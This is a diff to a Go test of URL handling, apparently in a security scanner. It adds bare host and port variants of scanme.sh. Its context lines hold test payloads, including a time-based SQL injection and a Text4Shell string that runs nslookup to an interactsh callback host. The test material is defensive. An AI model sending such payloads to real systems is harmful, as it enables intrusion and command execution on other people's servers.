@@ -12,6 +12,10 @@ func TestRequestUrls(t *testing.T) {
 		"https://scanme.sh?exploit=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(12)))nQIP)",
 		"https://scanme.sh/%20test%0a",
 		"https://scanme.sh/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d",
+		"scanme.sh",
+		"scanme.sh/with/path",
+		"scanme.sh:443",
+		"scanme.sh:443/with/path",
 	}
 
 	debug := os.Getenv("DEBUG")
